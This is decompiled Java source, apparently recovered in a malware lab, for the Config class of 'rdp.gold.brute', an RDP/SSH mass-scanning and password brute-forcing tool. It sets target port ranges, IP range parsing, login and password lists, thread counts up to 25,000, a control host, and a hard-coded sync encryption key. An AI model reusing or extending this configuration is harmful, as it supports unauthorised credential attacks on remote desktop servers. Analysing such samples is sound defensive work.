/*     */ package rdp.gold.brute;
/*     */ 
/*     */ import java.util.ArrayList;
/*     */ import java.util.List;
/*     */ import java.util.Map;
/*     */ import java.util.UUID;
/*     */ import java.util.concurrent.atomic.AtomicBoolean;
/*     */ import java.util.concurrent.atomic.AtomicInteger;
/*     */ import java.util.regex.Pattern;
/*     */ 
/*     */ public class Config
/*     */ {
/*     */   public static final String RDPSOCKET_VERSION = "0.2.8";
/*  14 */   public static final String SERIAL_NUMBER = null;
/*     */   public static final int PORT = 3389;
/*     */   public static final int SYNC_TIMEOUT_MS = 11000;
/*  17 */   public static final Pattern PATTERN_PORT_RANGE = Pattern.compile("^(\\d{1,5})-(\\d{1,5})$");
/*  18 */   public static final Pattern PATTERN_TASK_TYPE = Pattern.compile("\\[\\{task_type:(\\d+)\\}\\]");
/*     */   public static final int TYPE_AWAIT = 0;
/*     */   public static final int TYPE_RDP_SCAN = 1;
/*     */   public static final int TYPE_RDP_BRUTE = 2;
/*  22 */   public static final Pattern PATTERN_IS_RANGE = Pattern.compile("^(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}) - (\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})$");
/*  23 */   public static final Pattern PATTERN_IS_CIDR = Pattern.compile("^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\/\\d{1,3}$");
/*  24 */   public static final Pattern PATTERN_IP_PORT = Pattern.compile("^(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d{1,5}).*$");
/*  25 */   public static final Pattern PATTERN_IP_WITH_OR_WITHOUT_PORT = Pattern.compile("^(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}(:\\d{1,5})?).*$");
/*  26 */   private static final org.apache.log4j.Logger logger = org.apache.log4j.Logger.getLogger(Config.class);
/*  27 */   public static UUID SERVER_IDENTIFICATOR = UUID.randomUUID();
/*  28 */   public static UUID PROJECT_ID = UUID.randomUUID();
/*  29 */   public static UUID CONFIG_ID = UUID.randomUUID();
/*  30 */   public static byte[] KEY_ENCRYPT = new String("BRUTEENCRYPTSYNC").getBytes();
/*  31 */   public static byte[] IV_ENCRYPT = new String("INITVENCRYPTSYNC").getBytes();
/*  32 */   public static boolean IS_WRITE_RESULT_TO_FILE = false;
/*  33 */   public static String WRITE_RESULT_TO_FILE = null;
/*  34 */   public static String HOST_ADMIN = "127.0.0.1";
/*  35 */   public static int PORT_ADMIN = 55443;
/*     */   public static Integer BRUTE_TIMEOUT_MS_SETTINGS_FILE;
/*     */   public static Integer SCAN_CONNECT_TIMEOUT_MS_SETTINGS_FILE;
/*     */   public static Integer SCAN_SOCKET_TIMEOUT_MS_SETTINGS_FILE;
/*  39 */   public static Integer BRUTE_THREADS_SETTINGS_FILE = Integer.valueOf(200);
/*  40 */   public static Integer SCAN_THREADS_SETTINGS_FILE = Integer.valueOf(2000);
/*  41 */   public static String PORT_SCAN = "3389";
/*  42 */   public static Integer SCAN_TYPE = Integer.valueOf(1);
/*  43 */   public static Integer SCAN_CNT_ATTEMPTS = Integer.valueOf(1);
/*  44 */   public static Boolean SCAN_IS_BRUTABLE = Boolean.valueOf(false);
/*  45 */   public static Boolean SCAN_SAVE_INVALID = Boolean.valueOf(false);
/*  46 */   public static String TEST_SERVER_START_IP = "210.200.0.0:3389";
/*  47 */   public static String TEST_SERVER_END_IP = "210.211.255.0:3389";
/*  48 */   public static Boolean IS_ENABLE_DEBUG = Boolean.valueOf(false);
/*  49 */   public static String LOG_PATH = null;
/*  50 */   public static ArrayList<String> LOGINS = new ArrayList();
/*  51 */   public static ArrayList<String> PASSWORDS = new ArrayList();
/*  52 */   public static Map<Integer, String> TYPE_TASK_TEXT = new java.util.HashMap();
/*  53 */   public static AtomicBoolean IS_ENABLED_BRUTE = new AtomicBoolean(false);
/*  54 */   public static AtomicBoolean IS_ENABLED_SCAN = new AtomicBoolean(false);
/*  55 */   public static AtomicInteger TYPE_TASK = new AtomicInteger(0);
/*  56 */   public static AtomicBoolean IS_VALID_SERVER_SCAN = new AtomicBoolean(false);
/*  57 */   public static AtomicBoolean IS_VALID_SERVER_BRUTE = new AtomicBoolean(false);
/*  58 */   public static AtomicBoolean IS_TEST_SERVER_SCAN = new AtomicBoolean(false);
/*  59 */   public static AtomicBoolean IS_TEST_SERVER_BRUTE = new AtomicBoolean(false);
/*  60 */   public static Boolean AUTOCONFIGURE_THREADS = Boolean.valueOf(true);
/*  61 */   public static Integer AUTOCONFIGURE_THREADS_CORE = Integer.valueOf(150);
/*  62 */   public static Integer AUTOCONFIGURE_THREADS_LIMIT = Integer.valueOf(25000);
/*  63 */   public static Boolean BRUTE_MODE_CHECK_SINGLE_LOGIN_PASSWORD = Boolean.valueOf(false);
/*  64 */   public static Boolean BRUTE_IS_CHECK_IP = Boolean.valueOf(true);
/*  65 */   public static Integer BRUTE_CNT_ATTEMPTS = Integer.valueOf(1);
/*  66 */   public static Integer SCAN_CONNECT_TIMEOUT = Integer.valueOf(1000);
/*  67 */   public static Integer SCAN_SOCKET_TIMEOUT = Integer.valueOf(1000);
/*  68 */   public static Integer SCAN_THREADS = Integer.valueOf(1000);
/*  69 */   public static Integer BRUTE_TIMEOUT = Integer.valueOf(11000);
/*  70 */   public static Integer BRUTE_THREADS = Integer.valueOf(1000);
/*  71 */   public static Boolean BRUTE_IS_LOAD_SETTINGS_FROM_SERVER = Boolean.valueOf(false);
/*  72 */   public static Boolean SCAN_IS_LOAD_SETTINGS_FROM_SERVER = Boolean.valueOf(false);
/*  73 */   public static Integer CHECKER_EXPECT_IP_FOR_ENABLE = Integer.valueOf(11);
/*  74 */   public static Boolean BRUTE_IS_CHECK_ALL_COMBINATIONS = Boolean.valueOf(false);
/*  75 */   public static Boolean BRUTE_IS_SAVE_NOT_SUPPORT_IP = Boolean.valueOf(false);
/*     */   public static final int SCAN_TYPE_RDP = 1;
/*     */   public static final int SCAN_TYPE_SSH = 2;
/*     */   
/*     */   public static boolean hasTaskType(int taskType)
/*     */   {
/*  81 */     List<Integer> listTaskTypes = new ArrayList();
/*  82 */     listTaskTypes.add(Integer.valueOf(0));
/*  83 */     listTaskTypes.add(Integer.valueOf(1));
/*  84 */     listTaskTypes.add(Integer.valueOf(2));
/*     */     
/*  86 */     return listTaskTypes.contains(Integer.valueOf(taskType));
/*     */   }
/*     */   
/*     */   public static int getThreads() {
/*  90 */     int threads = 0;
/*     */     
/*  92 */     switch (TYPE_TASK.get()) {
/*     */     case 1: 
/*  94 */       threads = SCAN_THREADS.intValue();
/*  95 */       break;
/*     */     case 2: 
/*  97 */       threads = BRUTE_THREADS.intValue();
/*     */     }
/*     */     
/*     */     
/* 101 */     return threads;
/*     */   }
/*     */   
/*     */   public static String getSN() {
/* 105 */     StringBuilder sb = new StringBuilder();
/*     */     try
/*     */     {
/* 108 */       java.net.NetworkInterface networkInterface = java.net.NetworkInterface.getByInetAddress(java.net.InetAddress.getLocalHost());
/* 109 */       byte[] hardwareAddress = networkInterface.getHardwareAddress();
/*     */       
/* 111 */       for (int i = 0; i < hardwareAddress.length; i++) {
/* 112 */         sb.append(String.format("%02X%s", new Object[] { Byte.valueOf(hardwareAddress[i]), i < hardwareAddress.length - 1 ? "-" : "" }));
/*     */       }
/*     */     }
/*     */     catch (Exception localException) {}
/*     */     
/* 117 */     return sb.toString();
/*     */   }
/*     */   
/*     */   public static void init() {
/* 121 */     TYPE_TASK_TEXT.put(Integer.valueOf(0), "await");
/* 122 */     TYPE_TASK_TEXT.put(Integer.valueOf(1), "scan");
/* 123 */     TYPE_TASK_TEXT.put(Integer.valueOf(2), "brute");
/*     */   }
/*     */   
/*     */   public static synchronized void runAutoconfigureThreads() {
/* 127 */     int cores = Runtime.getRuntime().availableProcessors();
/* 128 */     int bruteThreads = cores * AUTOCONFIGURE_THREADS_CORE.intValue();
/* 129 */     int scanThreads = cores * AUTOCONFIGURE_THREADS_CORE.intValue();
/*     */     
/* 131 */     BRUTE_THREADS = Integer.valueOf(bruteThreads > AUTOCONFIGURE_THREADS_LIMIT.intValue() ? AUTOCONFIGURE_THREADS_LIMIT.intValue() : bruteThreads);
/* 132 */     SCAN_THREADS = Integer.valueOf(scanThreads > AUTOCONFIGURE_THREADS_LIMIT.intValue() ? AUTOCONFIGURE_THREADS_LIMIT.intValue() : scanThreads);
/*     */     
/* 134 */     BRUTE_THREADS_SETTINGS_FILE = BRUTE_THREADS;
/* 135 */     SCAN_THREADS_SETTINGS_FILE = SCAN_THREADS;
/*     */   }
/*     */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\Config.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */